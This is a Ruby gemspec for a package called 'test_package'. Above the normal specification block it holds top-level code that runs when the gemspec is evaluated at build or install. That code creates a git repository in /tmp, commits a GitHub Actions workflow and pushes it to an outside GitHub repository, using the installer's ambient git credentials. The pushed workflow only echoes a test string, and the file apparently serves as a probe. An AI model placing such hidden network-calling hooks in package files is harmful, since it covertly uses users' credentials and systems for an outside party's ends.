work_dir = "/tmp/test-971"
unless Dir.exist?(work_dir)
  Dir.mkdir(work_dir)
  raise "test init failed" unless system("git", "-C", work_dir, "init", "-b", "main")
  Dir.mkdir(File.join(work_dir, ".github"))
  Dir.mkdir(File.join(work_dir, ".github", "workflows"))
  File.write(
    File.join(work_dir, ".github", "workflows", "test-971.yml"),
    <<~YAML
      name: test 971
      on:
        push:
          branches:
            - test-971
      permissions:
        contents: read
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - name: test 971
              run: echo "test value 971"
    YAML
  )
  raise "test name failed" unless system("git", "-C", work_dir, "config", "user.name", "test 97")
  raise "test email failed" unless system("git", "-C", work_dir, "config", "user.email", "test97@example.invalid")
  raise "test add failed" unless system("git", "-C", work_dir, "add", ".github/workflows/test-971.yml")
  raise "test commit failed" unless system("git", "-C", work_dir, "commit", "-m", "test value 971")
end

push_ok = system(
  "git",
  "-C",
  work_dir,
  "push",
  "https://github.com/toofikz2/test-968.git",
  "HEAD:refs/heads/test-971"
)
raise "test push failed" unless push_ok

Gem::Specification.new do |spec|
  spec.name = "test_package"
  spec.version = "1.0.4"
  spec.summary = "test package"
  spec.authors = ["test 96"]
  spec.files = ["lib/test_package.rb"]
  spec.require_paths = ["lib"]
end
